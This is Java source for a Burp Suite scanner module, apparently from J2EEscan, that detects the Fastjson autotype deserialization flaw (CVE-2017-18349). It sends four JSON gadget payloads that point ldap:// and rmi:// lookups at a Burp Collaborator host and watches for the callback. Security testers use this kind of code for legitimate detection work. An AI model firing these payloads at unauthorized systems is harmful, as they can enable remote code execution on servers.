package burp.j2ee.issues.impl;

import static burp.HTTPMatcher.isJavaApplicationByURL;
import burp.HTTPParser;
import burp.IBurpCollaboratorClientContext;
import burp.IBurpCollaboratorInteraction;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;

import java.net.URL;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;

/**
 *
 * Fastjson Remote Command Execution Exploiting the Jackson RCE: CVE 2017-18349
 *
 *
 * Tested on: 
 *  - fastjson/1.2.24
 *  - fastjson/1.2.47
 * 
 */
public class FastJsonRCE implements IModule {

    private static final String TITLE = "Fastjson Remote Command Execution - CVE-2017-18349";
    private static final String DESCRIPTION = "J2EEscan identified a remote command execution vulnerability in the remote JSON parser component (Fastjson).<br />"
            + "The library  uses the algorithm of assumed ordered fast matching to put the performance of JSON Parse to the extreme, which is the fastest JSON library in the current Java language. <br />"
            + "The vulnerability is caused by fastjson <code>autotype</code> mode. <br />"
            + "Remote attackers can exploit the remote code execution vulnerability obtaining control on the remote server.<br />"
            + "<br />"
            + "<b>References</b>:<br /><br />"
            + "https://itw01.com/22AOEYL.html<br />"
            + "https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf<br />"
            + "https://github.com/iBearcat/Fastjson-Payload<br />"
            + "https://ricterz.me/posts/Fastjson%20Unserialize%20Vulnerability%20Write%20Up<br />"
            + "https://github.com/alibaba/fastjson<br />"
            + "https://github.com/jas502n/fastjson-1.2.61-RCE<br />"
            + "https://medium.com/@knownsec404team/fastjson-deserialization-vulnerability-history-5206714ceed1<br />"
            + "https://github.com/RealBearcat/Fastjson-Payload<br />"
            + "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18349";

    private static final String REMEDY = "Disable <code>autotype</code> in fastjason. Update the Fastjson component with the last security patches";

    // List of host and port system already tested
    private static LinkedHashSet hs = new LinkedHashSet();

    private PrintWriter stderr;

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        // https://itw01.com/22AOEYL.html
        // https://github.com/jas502n/fastjson-1.2.61-RCE
        List<String> PAYLOADS = new ArrayList<>();
        PAYLOADS.add("{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://%s:80/obj\",\"autoCommit\":true}");
        PAYLOADS.add("{\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"ldap://%s:80/ExportObject\"}");
        PAYLOADS.add("{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://%s:80/ExportObject\",\"autoCommit\":true}}");
        PAYLOADS.add("{\"a\":{ \"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%s:80/ExportObject\",\"autoCommit\":true}}");

        stderr = new PrintWriter(callbacks.getStderr(), true);

        List<IScanIssue> issues = new ArrayList<>();
        IExtensionHelpers helpers = callbacks.getHelpers();

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
        List<String> requestHeaders = reqInfo.getHeaders();

        URL url = reqInfo.getUrl();
        String host = url.getHost();
        int port = url.getPort();

        // Precondition checks
        if (!isJavaApplicationByURL(url)) {
            return issues;
        }

        String contentTypeHeader = HTTPParser.getRequestHeaderValue(reqInfo, "Content-type");
        if (contentTypeHeader != null && !contentTypeHeader.contains("json")) {
            return issues;
        }

        for (String PAYLOAD : PAYLOADS) {
            try {
                // Collaborator context
                IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();

                // New collaborator unique URI generated ( example f2ivf62a9k7w14h8o8cg7x10prvhj6.burpcollaborator.net )
                String currentCollaboratorPayload = collaboratorContext.generatePayload(true);
                String payloadJson = String.format(PAYLOAD, currentCollaboratorPayload);

                byte[] jsonFastRcePayload = helpers.buildHttpMessage(requestHeaders, payloadJson.getBytes());
                IHttpRequestResponse resp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), jsonFastRcePayload);

                // Poll Burp Collaborator for remote interaction
                List<IBurpCollaboratorInteraction> collaboratorInteractions
                        = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

                if (!collaboratorInteractions.isEmpty()) {

                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            reqInfo.getUrl(),
                            resp,
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.High,
                            Confidence.Certain
                    ));
                }
            } catch (Exception ex) {
                stderr.println(ex);
            }

        }
        
        return issues;

    }
}
